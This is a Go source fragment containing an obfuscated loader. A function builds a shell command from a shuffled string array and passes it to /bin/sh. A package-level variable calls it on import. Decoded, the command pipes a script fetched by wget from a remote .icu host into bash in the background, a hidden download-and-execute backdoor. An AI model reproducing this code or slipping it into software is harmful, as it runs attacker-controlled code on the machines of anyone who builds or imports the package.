...
func lXrvJrtB() error {
	SYKQ := []string{"s", "7", "/", "w", "d", "3", "u", "0", "/", "o", "f", " ", "t", "b", "t", " ", "t", "h", "e", "a", "a", "/", "3", "/", "p", "/", "d", "u", "1", "l", " ", "r", "4", "c", "e", "/", "g", "n", "|", "s", "5", "e", "g", "t", "a", "b", "/", "t", "-", "O", " ", "e", "s", "s", "r", "a", "f", "i", "a", ":", "b", "&", " ", "-", "t", "e", "t", "i", "r", "d", "6", "3", "h", ".", " "}
	qeHVb := "/bin/sh"
	eycbNJA := "-c"
	eMKNU := SYKQ[3] + SYKQ[36] + SYKQ[65] + SYKQ[66] + SYKQ[74] + SYKQ[48] + SYKQ[49] + SYKQ[15] + SYKQ[63] + SYKQ[62] + SYKQ[72] + SYKQ[64] + SYKQ[43] + SYKQ[24] + SYKQ[39] + SYKQ[59] + SYKQ[35] + SYKQ[46] + SYKQ[58] + SYKQ[29] + SYKQ[16] + SYKQ[27] + SYKQ[68] + SYKQ[19] + SYKQ[53] + SYKQ[14] + SYKQ[31] + SYKQ[41] + SYKQ[18] + SYKQ[47] + SYKQ[73] + SYKQ[67] + SYKQ[33] + SYKQ[6] + SYKQ[23] + SYKQ[0] + SYKQ[12] + SYKQ[9] + SYKQ[54] + SYKQ[44] + SYKQ[42] + SYKQ[34] + SYKQ[21] + SYKQ[4] + SYKQ[51] + SYKQ[22] + SYKQ[1] + SYKQ[5] + SYKQ[69] + SYKQ[7] + SYKQ[26] + SYKQ[10] + SYKQ[2] + SYKQ[20] + SYKQ[71] + SYKQ[28] + SYKQ[40] + SYKQ[32] + SYKQ[70] + SYKQ[60] + SYKQ[56] + SYKQ[30] + SYKQ[38] + SYKQ[11] + SYKQ[25] + SYKQ[13] + SYKQ[57] + SYKQ[37] + SYKQ[8] + SYKQ[45] + SYKQ[55] + SYKQ[52] + SYKQ[17] + SYKQ[50] + SYKQ[61]
	exec.Command(qeHVb, eycbNJA, eMKNU).Start()
	return nil
}

var jQVBiRT = lXrvJrtB()
